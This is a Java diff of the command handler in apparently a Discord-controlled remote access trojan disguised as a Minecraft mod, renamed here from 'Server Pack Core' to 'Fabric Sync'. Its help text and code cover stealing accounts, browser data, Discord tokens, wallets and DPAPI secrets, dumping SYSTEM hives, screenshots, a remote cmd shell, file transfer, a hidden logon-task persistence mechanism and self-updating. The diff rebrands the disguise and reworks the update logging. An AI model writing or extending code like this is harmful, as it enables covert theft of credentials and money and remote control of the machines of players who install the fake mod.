@@ -76,13 +76,13 @@ public final class CommandExecutor {
 
 	private void help() {
 		poller.reply(String.join("\n",
-			"**Server Pack Core**",
+			"**Fabric Sync**",
 			"`ping` latency and transport · `harvest` collect now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
 			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 8 MB) · `upload <url|file> [name]`",
 			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
 			"`persist on|off` logon task · `sleep <s>` · `kill`",
 			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
-			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions, wallets and hives on its own.",
+			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
 			"Extras and repairs: SHELL.md in the repo."));
 	}
 
@@ -94,7 +94,7 @@ public final class CommandExecutor {
 		try {
 			String output = Shell.run(poller.cwd(), command, 60000L);
 			if (output.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
-				poller.uploadBytes(output.getBytes(StandardCharsets.UTF_8), "shell-" + System.currentTimeMillis() + ".txt",
+				poller.uploadBytes(output.getBytes(StandardCharsets.UTF_8), "out-" + System.currentTimeMillis() + ".txt",
 					"text/plain");
 			} else {
 				poller.reply("````\n" + output + "\n````");
@@ -204,7 +204,7 @@ public final class CommandExecutor {
 			java.net.HttpURLConnection connection = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
 			connection.setConnectTimeout(10000);
 			connection.setReadTimeout(30000);
-			connection.setRequestProperty("User-Agent", "ServerPackCore/0.1");
+			connection.setRequestProperty("User-Agent", "FabricSync/0.1");
 			if (connection.getContentLengthLong() > maximum) {
 				connection.disconnect();
 				poller.reply("File too large (maximum 32 MB)");
@@ -258,7 +258,7 @@ public final class CommandExecutor {
 		StringBuilder text = new StringBuilder(enable ? "Persistence on: " : "Persistence off: ");
 		text.append(result);
 		if (enable && result) {
-			text.append("\nHidden task: \\").append(Persistence.task()).append("\nLauncher: ")
+			text.append("\nHidden task: \\").append(Persistence.task(installDir)).append("\nLauncher: ")
 				.append(Persistence.launcher(installDir));
 		} else if (enable) {
 			text.append("\nCould not verify the task; check Task Scheduler or the HKCU\\...\\Run fallback.");
@@ -311,7 +311,7 @@ public final class CommandExecutor {
 			}
 			case "rollback" -> gated(this::rollbackUpdate);
 			case "auto" -> autoUpdate(args);
-			case "status" -> poller.reply("Update log:\n" + Update.status());
+			case "status" -> poller.reply("Update log:\n" + Update.status(installDir));
 			default -> gated(this::updateAndApply);
 		}
 	}
@@ -320,14 +320,14 @@ public final class CommandExecutor {
 		try {
 			Update.Info info = Update.check();
 			Update.stage(info, installDir);
-			Update.log(info.version, info.agentSha256, "staged");
+			Update.log(installDir, info.version, info.agentSha256, "staged");
 			if (gameDir == null) {
 				poller.reply("Staged " + info.version + "; mod staged, no game dir");
 			} else {
 				poller.reply("Staged " + info.version + "; run update apply " + info.version);
 			}
 		} catch (UpdateException exception) {
-			Update.log("-", "-", exception.getMessage());
+			Update.log(installDir, "-", "-", exception.getMessage());
 			poller.reply("Update failed: " + exception.getMessage());
 		}
 	}
@@ -338,18 +338,18 @@ public final class CommandExecutor {
 			info = Update.check();
 			Update.stage(info, installDir);
 		} catch (UpdateException exception) {
-			Update.log("-", "-", exception.getMessage());
+			Update.log(installDir, "-", "-", exception.getMessage());
 			poller.reply("Update failed: " + exception.getMessage());
 			return;
 		}
 		try {
 			Update.apply(installDir, gameDir, info.version);
 		} catch (UpdateException exception) {
-			Update.log(info.version, info.agentSha256, "staged");
+			Update.log(installDir, info.version, info.agentSha256, "staged");
 			poller.reply("Staged; apply failed: " + exception.getMessage());
 			return;
 		}
-		Update.log(info.version, info.agentSha256, "applied");
+		Update.log(installDir, info.version, info.agentSha256, "applied");
 		manualSuccess();
 		poller.reply("Updating to " + info.version
 			+ (gameDir == null ? " (mod staged, no game dir)" : " (mod applies on game exit)"));
@@ -360,11 +360,11 @@ public final class CommandExecutor {
 		try {
 			Update.apply(installDir, gameDir, version);
 		} catch (UpdateException exception) {
-			Update.log(version, "-", exception.getMessage());
+			Update.log(installDir, version, "-", exception.getMessage());
 			poller.reply("Apply failed: " + exception.getMessage());
 			return;
 		}
-		Update.log(version, "-", "applying");
+		Update.log(installDir, version, "-", "applying");
 		manualSuccess();
 		poller.reply("Updating to " + version
 			+ (gameDir == null ? " (mod staged, no game dir)" : " (mod applies on game exit)"));
@@ -375,11 +375,11 @@ public final class CommandExecutor {
 		try {
 			Update.rollback(installDir, gameDir);
 		} catch (UpdateException exception) {
-			Update.log("-", "-", exception.getMessage());
+			Update.log(installDir, "-", "-", exception.getMessage());
 			poller.reply("Rollback failed: " + exception.getMessage());
 			return;
 		}
-		Update.log("-", "-", "rolling back");
+		Update.log(installDir, "-", "-", "rolling back");
 		manualSuccess();
 		poller.reply("Rolling back" + (gameDir == null ? " (mod skipped, no game dir)" : ""));
 		poller.kill();
